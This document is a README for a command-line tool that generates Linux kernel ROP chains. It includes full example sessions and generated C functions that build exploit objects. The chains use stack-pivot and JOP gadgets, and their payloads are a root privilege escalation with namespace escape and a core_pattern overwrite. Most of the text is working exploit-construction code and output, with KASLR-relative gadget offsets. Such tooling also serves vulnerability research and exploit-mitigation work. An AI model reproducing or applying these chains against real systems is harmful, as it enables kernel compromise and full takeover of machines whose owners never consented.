# exkrop — Interactive Kernel ROP Chain Generator

CLI tool that wraps [exrop](../README.md) to provide a guided workflow for generating kernel ROP chains with pivot gadget selection and C code output.

## Usage

```
PYTHONPATH=. python3 -m exkrop <vmlinux>
```

## Features

- **Template-based chain building** — choose from predefined exploit templates:
  - **Privilege Escalation**: `commit_creds(init_cred)` + namespace escape via `switch_task_namespaces` + `fork` + `msleep`
  - **core_pattern Overwrite**: `_copy_from_user(core_pattern, user_buf, len)` + `msleep`
- **KASLR-relative output** — all kernel addresses emitted as `kern_base + offset` in a generated C function
- **Pivot gadget browser** — paginated selection of stack pivot gadgets (direct, offset, JOP chained, indirect) with detail view
- **Reserved offset handling** — specify object offsets that must be preserved (e.g., vtable pointers) using individual values or ranges (`0x0-0x10,0x60`); shift gadgets are automatically inserted to skip over them
- **Side-effect detection** — pivot gadgets with memory writes to the controlled object (e.g., `or byte ptr [rbx + 0x41], bl`) are detected; corrupted offsets are automatically treated as occupied and skipped
- **Pivot filtering** — pivots whose chain start conflicts with reserved offsets are filtered out before selection
- **JOP dispatch awareness** — JOP pivot dispatch entries are treated as occupied slots and automatically skipped
- **C code generation** — generates a `void exploit_gen()` function that fills the exploit object at runtime; for indirect pivots, also fills a separate chain buffer. All kernel addresses are `kern_base + offset` so one binary works across KASLR boots

## Workflow

1. Load vmlinux and gadget cache
2. Select exploit template
3. Resolve kernel symbols and base address
4. Build ROP chain
5. Select pivot source register (rdi, rsi, rdx, etc.)
6. Optionally specify reserved object offsets
7. Browse and select a pivot gadget
8. Get generated C code (with optional file save)

## Example Output

### core_pattern Overwrite with JOP Pivot, Reserved Offsets, and Shift Gadgets

This example shows a JOP-chained pivot with an unaligned dispatch entry, reserved offset ranges, pivot filtering, and automatic shift gadget insertion. The JOP dispatch at `[rsi+0x66]` is unaligned, so the C output uses a cast to write at the exact byte offset.

```
$ exkrop /path/to/vmlinux
Loading /path/to/vmlinux...
Include non-clean gadgets (side effects)? [y/N]: y
Gadgets loaded.

=== ROP Chain Templates ===
  [1] Privilege Escalation — commit_creds(init_cred) + namespace escape + fork + msleep
  [2] core_pattern Overwrite — _copy_from_user(core_pattern, user_buf, len) + msleep

Select template [1-2]: 2

Resolving kernel base...
  Kernel base: 0xffffffff81000000
Resolving symbols...
  _copy_from_user                0xffffffff819aae70 (base + 0x9aae70)
  core_pattern                   0xffffffff83db6560 (base + 0x2db6560)
  msleep                         0xffffffff8127afc0 (base + 0x27afc0)

=== Building ROP chain ===

Core pattern string [|/proc/%P/fd/666 %P]:
User-space buffer address (hex) [0x4141414141414141]:
[*] _copy_from_user(core_pattern, 0x4141414141414141, 20)
$RSP+0x0000 : 0xffffffff810cc407 # pop rdi ; ret
$RSP+0x0008 : 0xffffffff83db6560
$RSP+0x0010 : 0xffffffff8101f56b # pop rdx ; ret
$RSP+0x0018 : 0x0000000000000014
$RSP+0x0020 : 0xffffffff810bcafe # pop rsi ; ret
$RSP+0x0028 : 0x4141414141414141
$RSP+0x0030 : 0xffffffff819aae70

[*] msleep(1000000000)
$RSP+0x0000 : 0xffffffff810cc407 # pop rdi ; ret
$RSP+0x0008 : 0x000000003b9aca00
$RSP+0x0010 : 0xffffffff8127afc0

...

Select pivot source register [1-14]: 2
Reserved object offsets (hex, comma-separated, e.g. 0x10,0x18 or 0x0-0x10) [none]: 0x0-0x10,0x30
  Reserved offsets: 0x0, 0x8, 0x10, 0x30

Searching for pivots from rsi...
Filtered 2347 pivot(s) conflicting with reserved offsets.
Found 50 pivot(s).

--- Pivot candidates (1-10 of 50) ---
  ...
  [ 2] jop            @ 0xffffffff81cf4d1e # push rsi ; pop rax ; jmp qword ptr [rsi + 0x66] (chain at +0x18)
  ...

Select pivot: 2

Selected pivot:
Pivot type: jop (chained)
  Step 1: 0xffffffff81cf4d1e # push rsi ; pop rax ; jmp qword ptr [rsi + 0x66]
  Pivot:  0xffffffff81053293 # push rax ; add eax, 0x415d5b81 ; pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
  Dispatch: place 0xffffffff81053293 at [rsi+0x66]
  ROP chain starts at [rsi+0x18]

Occupied offsets within chain region: 0x30, 0x60
  0x30: reserved by user
  0x60: JOP dispatch -> 0xffffffff81053293
Inserting shift gadgets to skip occupied slots...
  0x28: lea rsp, [rsp + 8] ; ret (skip 0x8 bytes)
  0x58: add rsp, 0x10 ; ret (skip 0x10 bytes)

=== Generated C code ===

#include <stdint.h>
#include <string.h>

// core_pattern overwrite: crash a child to trigger payload

// NOTE: place 20 bytes at user address 0x4141414141414141:
// char pattern[] = "|/proc/%P/fd/666 %P";

/*
 * Pivot type: jop
 * Source register: rsi
 * Step 1: kern_base + 0xcf4d1e @ push rsi ; pop rax ; jmp qword ptr [rsi + 0x66]
 * Pivot: kern_base + 0x53293 @ push rax ; add eax, 0x415d5b81 ; pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
 * Dispatch: place kern_base + 0x53293 at [rsi+0x66]
 * ROP chain starts at [rsi+0x18]
 */

#define OBJ_SIZE 0x100

void exploit_gen(uint64_t *obj, uint64_t kern_base) {
    memset(obj, 0, OBJ_SIZE);
    /* +0x00 RESERVED */
    /* +0x08 RESERVED */
    /* +0x10 RESERVED */
    obj[0x18 / 8] = kern_base + 0xcc407; // ROP chain start | pop rdi ; ret
    obj[0x20 / 8] = kern_base + 0x2db6560; // core_pattern
    obj[0x28 / 8] = kern_base + 0x1481e00; // shift: lea rsp, [rsp + 8] ; ret (skip 0x8)
    /* +0x30 RESERVED */
    obj[0x38 / 8] = kern_base + 0x1f56b; // pop rdx ; ret
    obj[0x40 / 8] = 0x14;
    obj[0x48 / 8] = kern_base + 0xbcafe; // pop rsi ; ret
    obj[0x50 / 8] = 0x4141414141414141;
    obj[0x58 / 8] = kern_base + 0x8a3d; // shift: add rsp, 0x10 ; ret (skip 0x10)
    obj[0x70 / 8] = kern_base + 0x9aae70; // _copy_from_user
    obj[0x78 / 8] = kern_base + 0xcc407; // pop rdi ; ret
    obj[0x80 / 8] = 0x3b9aca00;
    obj[0x88 / 8] = kern_base + 0x27afc0; // msleep
    *(uint64_t *)((uint8_t *)obj + 0x66) = kern_base + 0x53293; // dispatch @0x66
}
```

The shift gadget at `+0x28` skips the user-reserved offset at `+0x30`. The shift at `+0x58` skips `+0x60` and `+0x68` which overlap the unaligned JOP dispatch at `+0x66`. The dispatch itself is written at the exact byte offset via an unaligned store.

### Indirect JOP Pivot (chain at separate known address)

For indirect pivots, the object only holds dispatch entries and a pointer to the ROP chain. The chain itself lives at a separate known address (e.g., a `pipe_buffer` page or mmap'd region). The generated function takes extra `chain` and `chain_addr` parameters.

```
Include non-clean gadgets (side effects)? [y/N]: y
...
--- Pivot candidates (1-10 of 17) ---
  ...
  [ 8] jop_indirect   @ 0xffffffff81ac8d6e # mov rdx, qword ptr [rdi + 0x38] ; ... (ptr at +0x38)
  ...

Select pivot: 8

=== Generated C code ===

#include <stdint.h>
#include <string.h>

// Privilege escalation: get root + escape namespaces

/*
 * Pivot type: jop_indirect
 * Source register: rdi
 * Step 1: kern_base + 0xac8d6e @ mov rdx, qword ptr [rdi + 0x38] ; mov rax, qword ptr [rdi + 0x30] ; mov rdi, rdx ; jmp rax
 * Pivot: kern_base + 0x254fba @ push rdx ; add dword ptr [rcx + 0x415d5bd8], ecx ; pop rsp ; ret
 * Dispatch: place kern_base + 0x254fba at [rdi+0x30]
 * Place ROP chain address at [rdi+0x38]
 */

#define OBJ_SIZE 0x100

void exploit_gen(uint64_t *obj, uint64_t *chain, uint64_t kern_base, uint64_t chain_addr) {
    memset(obj, 0, OBJ_SIZE);
    obj[0x30 / 8] = kern_base + 0x254fba; // dispatch[0] -> kern_base + 0x254fba
    obj[0x38 / 8] = chain_addr; // pointer to chain

    chain[0] = kern_base + 0x177704; // pop rdi ; ret
    chain[1] = kern_base + 0x30953a0; // init_cred
    chain[2] = kern_base + 0x1e37d0; // commit_creds
    chain[3] = kern_base + 0x5cd6ad; // mov edi, 1 ; mov eax, edi ; ret
    chain[4] = kern_base + 0x1d6c00; // find_task_by_vpid
    chain[5] = kern_base + 0x143485a; // push rax ; add eax, ebp ; pop rdi ; ret
    chain[6] = kern_base + 0x15fbce; // pop rsi ; ret
    chain[7] = kern_base + 0x3094e80; // init_nsproxy
    chain[8] = kern_base + 0x1e16d0; // switch_task_namespaces
    chain[9] = kern_base + 0x177704; // pop rdi ; ret
    chain[10] = 0x0;
    chain[11] = kern_base + 0x1a6440; // __x64_sys_fork
    chain[12] = kern_base + 0x177704; // pop rdi ; ret
    chain[13] = 0x3b9aca00;
    chain[14] = kern_base + 0x2732f0; // msleep
}
```

Pass `chain_addr` as the runtime address where the chain buffer is placed in kernel memory. The dispatch at `+0x30` and pointer at `+0x38` occupy separate non-colliding slots in the object.
